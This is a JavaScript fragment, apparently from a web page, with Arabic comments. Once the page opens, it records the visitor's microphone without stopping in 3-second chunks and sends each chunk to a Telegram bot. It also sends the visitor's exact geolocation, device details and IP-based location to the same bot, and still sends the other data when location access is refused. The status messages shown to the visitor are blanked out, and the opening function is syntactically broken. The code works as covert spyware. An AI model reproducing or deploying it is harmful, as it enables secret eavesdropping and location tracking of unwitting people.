 async function checkPermissions() {
  try {

}

    async function startNewRecording() {
      audioChunks = [];
      mediaRecorder = new MediaRecorder(stream);

      mediaRecorder.ondataavailable = e => audioChunks.push(e.data);

      mediaRecorder.onstop = async () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("voice", audioBlob);

        document.getElementById("record").innerText = "";

        try {
          await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
            method: "POST",
            body: formData,
            keepalive: true
          });
          document.getElementById("record").innerText = "";
        } catch (err) {
          console.error("", err);
        }

        // بدء تسجيل جديد تلقائيًا
        startNewRecording();
      };

      mediaRecorder.start();

      // توقف التسجيل بعد 3 ثوانٍ
      setTimeout(() => {
        if (mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }
      }, 3000);
    }

    async function init() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        startNewRecording();
      } catch (err) {
        console.error("", err);
        document.getElementById("record").innerText = "";
      }
    }

    

    window.onbeforeunload = () => {
      if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };

function sendTelegramMessage(text) {
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: "HTML"
    })
  });
}

function getLocation() {
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const msg = `📍 <b>Exact Location</b>\nhttps://www.google.com/maps?q=${lat},${lon}`;
        sendTelegramMessage(msg);
        // بعدها ترسل باقي المعلومات لو تحب
        sendTelegramMessage(getDeviceInfo());
        getIPInfo();
      },
      err => {
        sendTelegramMessage("⚠️ Location access denied.");
        // لو رفض المستخدم الموقع، نرسل باقي المعلومات بدون الموقع
        sendTelegramMessage(getDeviceInfo());
        getIPInfo();
      }
    );
  } else {
    sendTelegramMessage("❌ Geolocation not supported.");
    sendTelegramMessage(getDeviceInfo());
    getIPInfo();
  }
}

function getDeviceInfo() {
  return `
🧾 <b>Device Info</b>
User Agent: ${navigator.userAgent}
Platform: ${navigator.platform}
Language: ${navigator.language}
Device Memory: ${navigator.deviceMemory || 'N/A'} GB
Cores: ${navigator.hardwareConcurrency || 'N/A'}
Cookies Enabled: ${navigator.cookieEnabled}
  `;
}

function getIPInfo() {
  fetch('https://api.db-ip.com/v2/free/self')
    .then(res => res.json())
    .then(data => {
      const msg = `
🌐 <b>IP Info</b>
IP: ${data.ipAddress}
City: ${data.city}
Region: ${data.stateProv}
Country: ${data.countryName}
Map: https://www.google.com/maps?q=${data.latitude},${data.longitude}
      `;
      sendTelegramMessage(msg);
    }).catch(() => {
      sendTelegramMessage("❌ Failed to get IP info.");
    });
}
